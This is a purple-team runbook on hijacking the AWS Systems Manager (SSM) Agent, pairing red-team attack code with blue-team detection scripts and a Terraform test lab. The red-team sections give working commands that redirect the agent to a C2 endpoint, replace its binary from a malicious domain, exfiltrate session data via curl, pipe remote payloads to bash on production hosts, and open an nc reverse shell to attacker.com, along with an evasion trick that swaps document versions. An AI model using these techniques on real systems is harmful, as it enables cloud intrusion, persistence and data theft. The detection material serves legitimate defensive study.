# Advanced Technical Runbook: SSM Agent Hijacking

## Red Team: Extended Technical Exploitation Techniques

### 1. Advanced SSM Agent Manipulation

#### Direct SSM Agent Configuration Tampering
```bash
# Locate SSM Agent configuration files
find / -name "amazon-ssm-agent.json" -type f 2>/dev/null

# Modify endpoint configuration to point to attacker-controlled endpoint
sudo sed -i 's/ssm.us-east-1.amazonaws.com/attacker-c2-mimicking-ssm.com/g' /etc/amazon/ssm/amazon-ssm-agent.json

# Restart agent to apply changes
sudo systemctl restart amazon-ssm-agent
```

#### Agent Binary Replacement
```bash
# Back up legitimate agent for later restoration
sudo cp /usr/bin/amazon-ssm-agent /usr/bin/amazon-ssm-agent.bak

# Replace with modified version
sudo curl -o /usr/bin/amazon-ssm-agent https://malicious-domain.com/fake-ssm-agent
sudo chmod +x /usr/bin/amazon-ssm-agent
sudo systemctl restart amazon-ssm-agent
```

### 2. Sophisticated SSM Document Techniques

#### Parameterized Obfuscation Document
```json
{
  "schemaVersion": "2.2",
  "description": "Maintenance Document",
  "parameters": {
    "Command": {
      "type": "String",
      "description": "Command to execute",
      "default": "echo Performing maintenance"
    },
    "EncodedPayload": {
      "type": "String",
      "description": "Base64 encoded payload",
      "default": ""
    }
  },
  "mainSteps": [
    {
      "action": "aws:runShellScript",
      "name": "runShellScript",
      "inputs": {
        "runCommand": [
          "if [ ! -z \"{{EncodedPayload}}\" ]; then",
          "  echo {{EncodedPayload}} | base64 -d | bash",
          "else",
          "  {{Command}}",
          "fi"
        ]
      }
    }
  ]
}
```

#### Multi-stage Command Execution to Evade Detection
```bash
# Stage 1: Create seemingly benign document
aws ssm create-document \
  --name "SecurityUpdates" \
  --content file://benign-looking-document.json \
  --document-type "Command"

# Stage 2: Update to include malicious content
aws ssm update-document \
  --name "SecurityUpdates" \
  --content file://malicious-document.json \
  --document-version '$LATEST'

# Stage 3: Execute and then immediately update back to benign version
aws ssm send-command \
  --document-name "SecurityUpdates" \
  --targets "Key=tag:Environment,Values=Production"

aws ssm update-document \
  --name "SecurityUpdates" \
  --content file://benign-looking-document.json \
  --document-version '$LATEST'
```

### 3. Advanced Persistence Mechanisms

#### Session Manager Plugin Hijacking
```bash
# Locate Session Manager plugin
which session-manager-plugin

# Create custom wrapper script
cat > ~/.local/bin/session-manager-plugin << 'EOF'
#!/bin/bash
# Path to original session-manager-plugin
ORIGINAL="/usr/local/bin/session-manager-plugin.original"

# Log all interactions
logger -t "ssm-session" "Session initiated with args: $@"

# Exfiltrate session data
(echo "Session initiated at $(date)"; echo "Args: $@") | \
  curl -s -X POST -d @- https://attacker-domain.com/collect

# Execute original for expected behavior
$ORIGINAL "$@"
EOF
chmod +x ~/.local/bin/session-manager-plugin

# Move original
sudo mv $(which session-manager-plugin) $(which session-manager-plugin).original
sudo ln -s ~/.local/bin/session-manager-plugin $(which session-manager-plugin)
```

#### Scheduled State Manager Association with Conditional Logic
```bash
aws ssm create-association \
  --name "AWS-RunShellScript" \
  --targets "Key=tag:Environment,Values=Production" \
  --parameters "commands=[\"if [ \\$(date +%H) -eq 3 ]; then curl -s https://attacker-c2/payload | bash; else echo 'Regular maintenance check'; fi\"]" \
  --schedule-expression "cron(0 * * * ? *)" \
  --compliance-severity "UNSPECIFIED" \
  --max-concurrency "10%" \
  --max-errors "10%"
```

### 4. SSM Parameter Store for Covert Storage

```bash
# Store encrypted payload in Parameter Store
aws ssm put-parameter \
  --name "/Maintenance/Script" \
  --value "$(cat payload.sh | base64)" \
  --type "SecureString" \
  --key-id "alias/aws/ssm" \
  --description "Maintenance update script"

# Create document that retrieves and executes
cat > execute-from-parameter.json << 'EOF'
{
  "schemaVersion": "2.2",
  "description": "Execute maintenance script",
  "mainSteps": [
    {
      "action": "aws:runShellScript",
      "name": "retrieveAndExecute",
      "inputs": {
        "runCommand": [
          "aws ssm get-parameter --name '/Maintenance/Script' --with-decryption --query 'Parameter.Value' --output text | base64 -d | bash"
        ]
      }
    }
  ]
}
EOF

aws ssm create-document \
  --name "MaintenanceFromParameter" \
  --content file://execute-from-parameter.json \
  --document-type "Command"
```

### 5. SSM Automation Document for Lateral Movement

```json
{
  "schemaVersion": "0.3",
  "description": "Maintenance automation across environments",
  "assumeRole": "{{AutomationAssumeRole}}",
  "parameters": {
    "AutomationAssumeRole": {
      "type": "String",
      "description": "Role ARN to assume for cross-account execution"
    },
    "TargetInstances": {
      "type": "StringList",
      "description": "Target instance IDs"
    }
  },
  "mainSteps": [
    {
      "name": "runCommand",
      "action": "aws:runCommand",
      "inputs": {
        "DocumentName": "AWS-RunShellScript",
        "InstanceIds": "{{TargetInstances}}",
        "Parameters": {
          "commands": [
            "#!/bin/bash",
            "# Establish reverse shell",
            "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f; rm /tmp/f"
          ]
        }
      }
    },
    {
      "name": "executeInAdditionalAccount",
      "action": "aws:executeAwsApi",
      "inputs": {
        "Service": "ssm",
        "Api": "SendCommand",
        "DocumentName": "AWS-RunShellScript",
        "Targets": [
          {
            "Key": "tag:CrossAccountAccess",
            "Values": ["True"]
          }
        ],
        "Parameters": {
          "commands": ["curl -s https://attacker.com/lateral | bash"]
        }
      }
    }
  ]
}
```

## Blue Team: Advanced Detection & Response

### 1. Custom CloudTrail Analysis with Advanced Filters

#### Python Script for Anomalous SSM Activity Detection
```python
import boto3
import json
import datetime
from collections import defaultdict

def analyze_ssm_activity(days=7):
    # Initialize CloudTrail client
    cloudtrail = boto3.client('cloudtrail')
    ssm = boto3.client('ssm')
    
    # Calculate time range
    end_time = datetime.datetime.utcnow()
    start_time = end_time - datetime.timedelta(days=days)
    
    # Collect baseline of normal SSM document usage
    normal_docs = {}
    response = ssm.list_documents(
        Filters=[{'Key': 'Owner', 'Values': ['Amazon', 'Self']}]
    )
    for doc in response['DocumentIdentifiers']:
        normal_docs[doc['Name']] = doc['Owner']
    
    # Track activity patterns
    user_activity = defaultdict(lambda: defaultdict(int))
    document_usage = defaultdict(lambda: defaultdict(int))
    ip_activity = defaultdict(lambda: defaultdict(int))
    
    # Look up events
    paginator = cloudtrail.get_paginator('lookup_events')
    for page in paginator.paginate(
        LookupAttributes=[{'AttributeKey': 'EventSource', 'AttributeValue': 'ssm.amazonaws.com'}],
        StartTime=start_time,
        EndTime=end_time
    ):
        for event in page['Events']:
            event_name = event['EventName']
            username = event.get('Username', 'Unknown')
            source_ip = json.loads(event['CloudTrailEvent'])['sourceIPAddress']
            
            user_activity[username][event_name] += 1
            ip_activity[source_ip][event_name] += 1
            
            # Check for document usage
            if event_name == 'SendCommand':
                cloud_trail_event = json.loads(event['CloudTrailEvent'])
                request_parameters = cloud_trail_event.get('requestParameters', {})
                document_name = request_parameters.get('documentName', 'Unknown')
                document_usage[document_name][username] += 1
    
    # Detect anomalies
    print("=== Potential Anomalies ===")
    
    # Users with unusual SSM activity
    for user, actions in user_activity.items():
        if 'SendCommand' in actions and actions['SendCommand'] > 20:
            print(f"High SendCommand volume from user {user}: {actions['SendCommand']} commands")
        
        if 'CreateDocument' in actions and actions['CreateDocument'] > 3:
            print(f"Multiple document creations by {user}: {actions['CreateDocument']} documents")
            
        if 'DeleteDocument' in actions and actions['DeleteDocument'] > 3:
            print(f"Multiple document deletions by {user}: {actions['DeleteDocument']} deletions")
    
    # Unusual document executions
    for doc_name, users in document_usage.items():
        if doc_name not in normal_docs and sum(users.values()) > 5:
            print(f"Non-standard document {doc_name} used frequently: {sum(users.values())} times")
    
    # IP address anomalies
    for ip, actions in ip_activity.items():
        if sum(actions.values()) > 50:
            print(f"High activity volume from IP {ip}: {sum(actions.values())} actions")

if __name__ == "__main__":
    analyze_ssm_activity()
```

#### Enhanced CloudWatch Insights Queries

```
# Detect unusual combinations of SSM APIs
filter eventSource = "ssm.amazonaws.com" 
| stats count() as apiCalls by eventName, userIdentity.arn, sourceIPAddress, eventTime
| sort apiCalls desc

# Identify suspicious command patterns in SSM executions
filter eventSource = "ssm.amazonaws.com" 
  and eventName = "SendCommand" 
  and requestParameters.documentName = "AWS-RunShellScript"
| parse requestParameters.parameters.commands[0] "curl *" as curlCommand
| parse requestParameters.parameters.commands[0] "wget *" as wgetCommand
| parse requestParameters.parameters.commands[0] "base64 *" as base64Command
| stats count() by userIdentity.arn, curlCommand, wgetCommand, base64Command

# Detect possible token hijacking
filter eventSource = "ssm.amazonaws.com" 
| stats count() as eventCount by eventName, userIdentity.sessionContext.sessionIssuer.userName, sourceIPAddress 
| filter eventCount > 10
| sort eventCount desc
```

### 2. Advanced SSM Agent Integrity Monitoring

#### Custom SSM Agent Integrity Check Script
```bash
#!/bin/bash
# SSM Agent integrity verification script

# Known good SHA256 hashes - update these based on your deployed versions
KNOWN_GOOD_HASHES=(
  "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0"
  "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d"
)

# Check SSM Agent binary
AGENT_PATH=$(which amazon-ssm-agent)
if [ -z "$AGENT_PATH" ]; then
  AGENT_PATH="/usr/bin/amazon-ssm-agent"
fi

if [ ! -f "$AGENT_PATH" ]; then
  echo "ERROR: SSM Agent binary not found"
  exit 1
fi

# Calculate hash
AGENT_HASH=$(sha256sum "$AGENT_PATH" | awk '{print $1}')
HASH_VALID=0

for hash in "${KNOWN_GOOD_HASHES[@]}"; do
  if [ "$AGENT_HASH" == "$hash" ]; then
    HASH_VALID=1
    break
  fi
done

if [ $HASH_VALID -eq 0 ]; then
  echo "WARNING: SSM Agent binary hash ($AGENT_HASH) doesn't match known good hashes"
  echo "Possible tampering detected!"
fi

# Check configuration file integrity
CONFIG_FILE="/etc/amazon/ssm/amazon-ssm-agent.json"
if [ -f "$CONFIG_FILE" ]; then
  # Check for suspicious endpoints
  grep -E "endpoint.*\.(amazonaws\.com|amazon\.com)" "$CONFIG_FILE" > /dev/null
  if [ $? -ne 0 ]; then
    echo "WARNING: Suspicious endpoint configuration in SSM Agent config"
    grep "endpoint" "$CONFIG_FILE"
  fi
else
  echo "ERROR: SSM Agent config file not found"
fi

# Check for unauthorized SSM plugins
PLUGIN_DIR="/etc/amazon/ssm/plugins"
if [ -d "$PLUGIN_DIR" ]; then
  find "$PLUGIN_DIR" -type f -exec sha256sum {} \; > /tmp/plugin_hashes.txt
  echo "SSM plugin files found:"
  cat /tmp/plugin_hashes.txt
else
  echo "INFO: SSM plugins directory not found"
fi

# Check for suspicious processes accessing SSM
echo "Processes accessing SSM agent files:"
lsof | grep -i ssm | grep -v "^COMMAND"

# Check SSM service status
echo "SSM service status:"
systemctl status amazon-ssm-agent
```

#### Agent Configuration Monitoring via Custom CloudWatch Metric Filter
```bash
# Create a custom metric filter for SSM Agent config changes
aws logs create-metric-filter \
  --log-group-name "/var/log/amazon/ssm/amazon-ssm-agent.log" \
  --filter-name "ConfigurationChanges" \
  --filter-pattern "[date, time, level=INFO, thread, ..., message=*Configuration has changed*]" \
  --metric-transformations \
      metricName=SSMConfigurationChanges,metricNamespace=SecurityMetrics,metricValue=1

# Create alarm for configuration changes
aws cloudwatch put-metric-alarm \
  --alarm-name SSMConfigChangeAlarm \
  --alarm-description "Alert on SSM Agent configuration changes" \
  --metric-name SSMConfigurationChanges \
  --namespace SecurityMetrics \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:region:account-id:security-alerts
```

### 3. Advanced SSM Document Security Controls

#### SSM Document Linting & Security Scanning Tool
```python
import boto3
import json
import re
import sys

def scan_ssm_document(document_content):
    """Scan SSM document for security issues"""
    issues = []
    
    content = json.loads(document_content)
    
    # Check for shell script execution
    if "mainSteps" in content:
        for step in content["mainSteps"]:
            if step.get("action") == "aws:runShellScript":
                inputs = step.get("inputs", {})
                commands = inputs.get("runCommand", [])
                
                for cmd in commands:
                    # Check for suspicious command patterns
                    if re.search(r'(curl|wget)\s+.*\s*\|\s*(bash|sh)', cmd):
                        issues.append(f"Suspicious pipe to shell: {cmd}")
                    
                    if re.search(r'base64\s+--decode', cmd) or 'base64 -d' in cmd:
                        issues.append(f"Base64 decoding detected: {cmd}")
                    
                    if re.search(r'(nc|netcat|ncat).+\s+-e\s+', cmd):
                        issues.append(f"Possible reverse shell: {cmd}")
                    
                    if 'eval' in cmd and ('$(' in cmd or '`' in cmd):
                        issues.append(f"Suspicious eval construct: {cmd}")
            
            # Check for AWS API calls that could be used for privilege escalation
            if step.get("action") == "aws:executeAwsApi":
                inputs = step.get("inputs", {})
                service = inputs.get("Service", "")
                api = inputs.get("Api", "")
                
                if service.lower() == "iam":
                    issues.append(f"Document contains IAM API calls: {api}")
                
                if service.lower() == "sts" and api.lower() == "assumerolewithwebidentity":
                    issues.append("Document contains STS AssumeRoleWithWebIdentity call")
    
    # Check for suspicious parameter patterns
    if "parameters" in content:
        for param_name, param_details in content["parameters"].items():
            if param_details.get("type") == "String" and param_name.lower() in ["command", "script", "payload"]:
                issues.append(f"Potentially dangerous parameter name: {param_name}")
    
    return issues

def scan_all_documents():
    """Scan all SSM documents in the account"""
    ssm = boto3.client('ssm')
    
    print("Scanning SSM documents...")
    
    # Get all documents owned by the account
    response = ssm.list_documents(
        Filters=[{'Key': 'Owner', 'Values': ['Self']}]
    )
    
    documents = response.get('DocumentIdentifiers', [])
    
    for doc in documents:
        doc_name = doc['Name']
        print(f"Scanning document: {doc_name}")
        
        # Get document content
        doc_response = ssm.get_document(
            Name=doc_name,
            DocumentVersion='$LATEST'
        )
        
        content = doc_response['Content']
        
        # Scan document for issues
        issues = scan_ssm_document(content)
        
        if issues:
            print(f"Issues found in document {doc_name}:")
            for issue in issues:
                print(f"  - {issue}")
        else:
            print(f"No issues found in document {doc_name}")
        
        print("")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Scan specific document
        with open(sys.argv[1], 'r') as f:
            content = f.read()
        
        issues = scan_ssm_document(content)
        
        if issues:
            print("Issues found:")
            for issue in issues:
                print(f"  - {issue}")
        else:
            print("No issues found.")
    else:
        # Scan all documents in account
        scan_all_documents()
```

#### SSM Document Approval Workflow (Infrastructure as Code)
```yaml
# CloudFormation template for SSM document approval workflow
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Infrastructure for SSM document approval workflow'

Resources:
  # SNS Topic for approval notifications
  SSMDocumentApprovalTopic:
    Type: 'AWS::SNS::Topic'
    Properties:
      DisplayName: 'SSM Document Approval Notifications'
      TopicName: 'ssm-document-approval'

  # Lambda function for SSM document validation
  SSMDocumentValidator:
    Type: 'AWS::Lambda::Function'
    Properties:
      Handler: index.handler
      Role: !GetAtt SSMDocumentValidatorRole.Arn
      Runtime: python3.9
      Timeout: 30
      Code:
        ZipFile: |
          import boto3
          import json
          import re
          import os

          def handler(event, context):
              # Get EventBridge event details
              detail = event['detail']
              event_name = detail['eventName']
              
              # We're only interested in document creation/update events
              if event_name not in ['CreateDocument', 'UpdateDocument', 'UpdateDocumentDefaultVersion']:
                  return
              
              ssm = boto3.client('ssm')
              sns = boto3.client('sns')
              
              # Get document details
              doc_name = detail['requestParameters'].get('name')
              if not doc_name:
                  return
                  
              try:
                  # Get document content
                  response = ssm.get_document(Name=doc_name)
                  content = json.loads(response['Content'])
                  
                  # Perform security checks
                  issues = []
                  
                  # Check for suspicious commands
                  if "mainSteps" in content:
                      for step in content["mainSteps"]:
                          if step.get("action") == "aws:runShellScript":
                              inputs = step.get("inputs", {})
                              commands = inputs.get("runCommand", [])
                              
                              for cmd in commands:
                                  if re.search(r'(curl|wget)\s+.*\s*\|\s*(bash|sh)', cmd):
                                      issues.append(f"Suspicious pipe to shell: {cmd}")
                                  
                                  if re.search(r'base64\s+--decode', cmd) or 'base64 -d' in cmd:
                                      issues.append(f"Base64 decoding detected: {cmd}")
                  
                  # Create approval message
                  message = {
                      "documentName": doc_name,
                      "action": event_name,
                      "requestedBy": detail.get('userIdentity', {}).get('arn', 'Unknown'),
                      "timestamp": detail.get('eventTime'),
                      "issues": issues,
                      "approvalRequired": len(issues) > 0,
                      "documentLink": f"https://console.aws.amazon.com/systems-manager/documents/{doc_name}/details"
                  }
                  
                  # Send approval notification
                  sns.publish(
                      TopicArn=os.environ['SNS_TOPIC_ARN'],
                      Subject=f"SSM Document Approval Required: {doc_name}",
                      Message=json.dumps(message, indent=2)
                  )
                  
                  # If issues were found, add document to a quarantine tag
                  if issues:
                      ssm.add_tags_to_resource(
                          ResourceType='Document',
                          ResourceId=doc_name,
                          Tags=[
                              {'Key': 'Status', 'Value': 'Quarantined'},
                              {'Key': 'ApprovalRequired', 'Value': 'Yes'}
                          ]
                      )
                      
              except Exception as e:
                  print(f"Error processing document {doc_name}: {str(e)}")
      Environment:
        Variables:
          SNS_TOPIC_ARN: !Ref SSMDocumentApprovalTopic

  # IAM Role for Lambda function
  SSMDocumentValidatorRole:
    Type: 'AWS::IAM::Role'
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: 'sts:AssumeRole'
      ManagedPolicyArns:
        - 'arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole'
      Policies:
        - PolicyName: SSMDocumentAccess
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - 'ssm:GetDocument'
                  - 'ssm:AddTagsToResource'
                Resource: '*'
              - Effect: Allow
                Action: 'sns:Publish'
                Resource: !Ref SSMDocumentApprovalTopic

  # EventBridge rule to capture SSM document events
  SSMDocumentEventRule:
    Type: 'AWS::Events::Rule'
    Properties:
      Description: 'Capture SSM document creation and update events'
      EventPattern:
        source:
          - 'aws.ssm'
        detail-type:
          - 'AWS API Call via CloudTrail'
        detail:
          eventSource:
            - 'ssm.amazonaws.com'
          eventName:
            - 'CreateDocument'
            - 'UpdateDocument'
            - 'UpdateDocumentDefaultVersion'
      State: 'ENABLED'
      Targets:
        - Arn: !GetAtt SSMDocumentValidator.Arn
          Id: 'SSMDocumentValidator'

  # Permission to allow EventBridge to invoke Lambda
  SSMDocumentEventRulePermission:
    Type: 'AWS::Lambda::Permission'
    Properties:
      Action: 'lambda:InvokeFunction'
      FunctionName: !Ref SSMDocumentValidator
      Principal: 'events.amazonaws.com'
      SourceArn: !GetAtt SSMDocumentEventRule.Arn
```

### 4. Custom Network-Level SSM Monitoring

#### VPC Flow Log Analysis for SSM Traffic Patterns
```python
import boto3
import pandas as pd
import matplotlib.pyplot as plt
from datetime import datetime, timedelta

def analyze_ssm_traffic(region='us-east-1', days=7):
    # Initialize clients
    logs = boto3.client('logs', region_name=region)
    ec2 = boto3.client('ec2', region_name=region)
    
    # Get all VPC Flow Log groups
    response = logs.describe_log_groups(
        logGroupNamePrefix='/aws/vpc/flowlogs'
    )
    
    log_groups = [group['logGroupName'] for group in response.get('logGroups', [])]
    if not log_groups:
        print("No VPC Flow Log groups found")
        return
    
    # Get SSM endpoints
    ssm_endpoints = []
    
    # Get standard service endpoints
    response = ec2.describe_vpc_endpoints(
        Filters=[{'Name': 'service-name', 'Values': ['com.amazonaws.*.ssm']}]
    )
    for endpoint in response.get('VpcEndpoints', []):
        for dns in endpoint.get('DnsEntries', []):
            ssm_endpoints.append(dns.get('DnsName'))
    
    # Add standard AWS SSM endpoints for regions
    aws_regions = boto3.Session().get_available_regions('ssm')
    for aws_region in aws_regions:
        ssm_endpoints.append(f"ssm.{aws_region}.amazonaws.com")
    
    # Calculate time range
    end_time = datetime.utcnow()
    start_time = end_time - timedelta(days=days)
    
    # Prepare query
    ssm_endpoint_query = " or ".join([f"dstAddr LIKE '{endpoint}'" for endpoint in ssm_endpoints])
    query = f"""
    filter (dstPort = 443 and ({ssm_endpoint_query})) or 
           (srcPort = 443 and ({ssm_endpoint_query.replace('dstAddr', 'srcAddr')}))
    | stats 
        sum(bytes) as bytes,
        count() as flowCount
        by srcAddr, dstAddr, srcPort, dstPort, protocol, action, accountId, instance_id
    | sort bytes desc
    """
    
    # Execute query
    results = []
    for log_group in log_groups:
        try:
            query_response = logs.start_query(
                logGroupName=log_group,
                startTime=int(start_time.timestamp()),
                endTime=int(end_time.timestamp()),
                queryString=query
            )
            
            query_id = query_response['queryId']
            
            # Wait for query to complete
            response = None
            while response is None or response['status'] == 'Running':
                response = logs.get_query_results(queryId=query_id)
                if response['status'] == 'Running':
                    import time
                    time.sleep(1)
            
            # Process results
            for result in response.get('results', []):
                result_dict = {}
                for field in result:
                    result_dict[field['field']] = field['value']
                results.append(result_dict)
        except Exception as e:
            print(f"Error querying {log_group}: {str(e)}")
    
    if not results:
        print("No SSM traffic found in the analyzed period")
        return
    
    # Convert to DataFrame
    df = pd.DataFrame(results)
    
    # Basic analysis
    print(f"Total SSM traffic flows: {len(df)}")
    
    # Visualize top talkers
    if 'srcAddr' in df.columns and 'bytes' in df.columns:
        top_talkers = df.groupby('srcAddr')['bytes'].sum().nlargest(10)
        plt.figure(figsize=(12, 6))
        top_talkers.plot(kind='bar')
        plt.title('Top 10 SSM Traffic Sources')
        plt.ylabel('Bytes')
        plt.xlabel('Source IP')
        plt.tight_layout()
        plt.savefig('ssm_top_talkers.png')
        print(f"Top talkers chart saved to ssm_top_talkers.png")
    
    # Traffic over time
    if 'accountId' in df.columns and 'bytes' in df.columns:
        traffic_by_account = df.groupby('accountId')['bytes'].sum()
        print("\nSSM Traffic by Account:")
        print(traffic_by_account)
    
    # Anomaly detection - identify instances with unusually high SSM traffic
    if 'instance_id' in df.columns and 'bytes' in df.columns:
        instance_traffic = df.groupby('instance_id')['bytes'].sum()
        mean_traffic = instance_traffic.mean()
        std_traffic = instance_traffic.std()
        
        anomalous_instances = instance_traffic[instance_traffic > mean_traffic + 2*std_traffic]
        
        if not anomalous_instances.empty:
            print("\nPotentially anomalous instances (high SSM traffic):")
            print(anomalous_instances)

if __name__ == "__main__":
    analyze_ssm_traffic()
```

## Engineering Test Environment Setup

### Terraform for Isolated Purple Team Environment
```hcl
provider "aws" {
  region = "us-west-2"
}

# Create isolated VPC for testing
resource "aws_vpc" "purple_team_vpc" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
  
  tags = {
    Name        = "PurpleTeamVPC"
    Environment = "Testing"
  }
}

# Create subnets
resource "aws_subnet" "public_subnet" {
  vpc_id                  = aws_vpc.purple_team_vpc.id
  cidr_block              = "10.0.1.0/24"
  availability_zone       = "us-west-2a"
  map_public_ip_on_launch = true
  
  tags = {
    Name = "PurpleTeam-Public"
  }
}

resource "aws_subnet" "private_subnet" {
  vpc_id            = aws_vpc.purple_team_vpc.id
  cidr_block        = "10.0.2.0/24"
  availability_zone = "us-west-2a"
  
  tags = {
    Name = "PurpleTeam-Private"
  }
}

# Internet Gateway
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.purple_team_vpc.id
  
  tags = {
    Name = "PurpleTeam-IGW"
  }
}

# Route table for public subnet
resource "aws_route_table" "public_route_table" {
  vpc_id = aws_vpc.purple_team_vpc.id
  
  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.igw.id
  }
  
  tags = {
    Name = "PurpleTeam-Public-Routes"
  }
}

resource "aws_route_table_association" "public_subnet_association" {
  subnet_id      = aws_subnet.public_subnet.id
  route_table_id = aws_route_table.public_route_table.id
}

# Security Groups
resource "aws_security_group" "bastion_sg" {
  name        = "bastion-sg"
  description = "Security group for bastion host"
  vpc_id      = aws_vpc.purple_team_vpc.id
  
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # In production, restrict to your IP
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_security_group" "target_sg" {
  name        = "target-sg"
  description = "Security group for target instances"
  vpc_id      = aws_vpc.purple_team_vpc.id
  
  ingress {
    from_port       = 22
    to_port         = 22
    protocol        = "tcp"
    security_groups = [aws_security_group.bastion_sg.id]
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# SSM VPC Endpoint (for isolated testing)
resource "aws_security_group" "vpc_endpoints_sg" {
  name        = "vpc-endpoints-sg"
  description = "Allow traffic to VPC endpoints"
  vpc_id      = aws_vpc.purple_team_vpc.id
  
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = [aws_vpc.purple_team_vpc.cidr_block]
  }
}

resource "aws_vpc_endpoint" "ssm" {
  vpc_id              = aws_vpc.purple_team_vpc.id
  service_name        = "com.amazonaws.us-west-2.ssm"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = [aws_subnet.private_subnet.id]
  security_group_ids  = [aws_security_group.vpc_endpoints_sg.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "ssm_messages" {
  vpc_id              = aws_vpc.purple_team_vpc.id
  service_name        = "com.amazonaws.us-west-2.ssmmessages"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = [aws_subnet.private_subnet.id]
  security_group_ids  = [aws_security_group.vpc_endpoints_sg.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "ec2_messages" {
  vpc_id              = aws_vpc.purple_team_vpc.id
  service_name        = "com.amazonaws.us-west-2.ec2messages"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = [aws_subnet.private_subnet.id]
  security_group_ids  = [aws_security_group.vpc_endpoints_sg.id]
  private_dns_enabled = true
}

# IAM Role for instances
resource "aws_iam_role" "ec2_ssm_role" {
  name = "ec2-ssm-role"
  
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy_attachment" "ssm_managed_instance" {
  role       = aws_iam_role.ec2_ssm_role.name
  policy_arn = "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
}

resource "aws_iam_instance_profile" "ec2_ssm_profile" {
  name = "ec2-ssm-profile"
  role = aws_iam_role.ec2_ssm_role.name
}

# Bastion Host
resource "aws_instance" "bastion" {
  ami                    = "ami-0c55b159cbfafe1f0"  # Amazon Linux 2
  instance_type          = "t2.micro"
  subnet_id              = aws_subnet.public_subnet.id
  vpc_security_group_ids = [aws_security_group.bastion_sg.id]
  key_name               = "purple-team-key"  # Make sure to create this key pair
  
  tags = {
    Name = "PurpleTeam-Bastion"
  }
}

# Target Instances for Purple Team Exercise
resource "aws_instance" "target_instances" {
  count                  = 5
  ami                    = "ami-0c55b159cbfafe1f0"  # Amazon Linux 2
  instance_type          = "t2.micro"
  subnet_id              = aws_subnet.private_subnet.id
  vpc_security_group_ids = [aws_security_group.target_sg.id]
  iam_instance_profile   = aws_iam_instance_profile.ec2_ssm_profile.name
  
  user_data = <<-EOF
    #!/bin/bash
    echo "Setting up target instance ${count.index}"
    yum update -y
    yum install -y amazon-ssm-agent
    systemctl enable amazon-ssm-agent
    systemctl start amazon-ssm-agent
  EOF
  
  tags = {
    Name        = "PurpleTeam-Target-${count.index}"
    Environment = "Testing"
    Role        = count.index < 2 ? "Admin" : "Application"
  }
}

# CloudWatch Log Group for centralized logging
resource "aws_cloudwatch_log_group" "ssm_logs" {
  name              = "/purple-team/ssm-activity"
  retention_in_days = 14
}

# Output connection information
output "bastion_public_ip" {
  value = aws_instance.bastion.public_ip
}

output "target_instance_ids" {
  value = aws_instance.target_instances[*].id
}
```

## Advanced Exercise Scenarios

### Scenario 1: Multi-Vector SSM Persistence

**Exercise Goal**: Build, detect, and respond to a complex SSM persistence mechanism leveraging multiple techniques

**Red Team Steps:**
1. Create a maintenance window with a custom document
2. Implement self-preservation mechanisms in document
3. Deploy custom SSM agent plugins
4. Implement backup C2 via parameter store

**Blue Team Goals:**
1. Detect the initial compromise
2. Identify and neutralize all persistence mechanisms
3. Develop comprehensive detection for similar future attacks

### Scenario 2: SSM Agent Supply Chain Attack

**Exercise Goal**: Simulate, detect, and respond to a compromised SSM agent binary

**Red Team Steps:**
1. Create a modified SSM agent binary with backdoor
2. Deploy via legitimate update channels
3. Implement stealthy command execution
4. Establish persistence that survives agent updates

**Blue Team Goals:**
1. Detect the compromised agent
2. Develop binary verification mechanisms
3. Create comprehensive incident response plan

### Scenario 3: Cross-Account SSM Exploitation

**Exercise Goal**: Simulate lateral movement between AWS accounts via SSM

**Red Team Steps:**
1. Compromise initial account SSM permissions
2. Identify cross-account SSM document sharing
3. Exploit shared documents to pivot between accounts
4. Establish persistence across account boundaries

**Blue Team Goals:**
1. Detect the cross-account activity
2. Implement proper boundary controls
3. Develop cross-account visibility and alerting

